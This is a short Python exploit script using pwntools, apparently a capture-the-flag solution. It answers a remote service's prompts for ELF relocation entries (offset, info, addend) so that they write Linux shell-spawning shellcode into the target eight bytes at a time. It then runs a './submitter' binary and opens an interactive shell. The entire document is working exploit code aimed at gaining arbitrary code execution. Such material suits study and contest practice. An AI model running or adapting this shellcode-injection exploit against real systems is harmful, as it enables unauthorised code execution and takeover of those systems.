import argparse
from pwn import *

context.arch = 'amd64'

parser = argparse.ArgumentParser()
parser.add_argument("--host", default="127.0.0.1")
parser.add_argument("--port", default="8000", type=int)

args = parser.parse_args()

r = remote(args.host, args.port)

def reloc(offset, info, addend):
    r.sendlineafter(b'r_offset = ', hex(offset)[2:].encode())
    r.sendlineafter(b'r_info = ', hex(info)[2:].encode())
    r.sendlineafter(b'r_addend = ', hex(addend)[2:].encode())

shellcode = asm(shellcraft.linux.sh())

relocs = []

for i in range(0, len(shellcode), 8):
    relocs.append((0x149c+i, 33, u64(shellcode[i:i+8])))

num_relocs = len(relocs)

for i in range(num_relocs):
    reloc(*relocs[i])
    r.readuntil(b'another?')
    r.sendline(b'1' if i != num_relocs - 1 else b'0')


r.sendline(b'./submitter')
r.interactive()
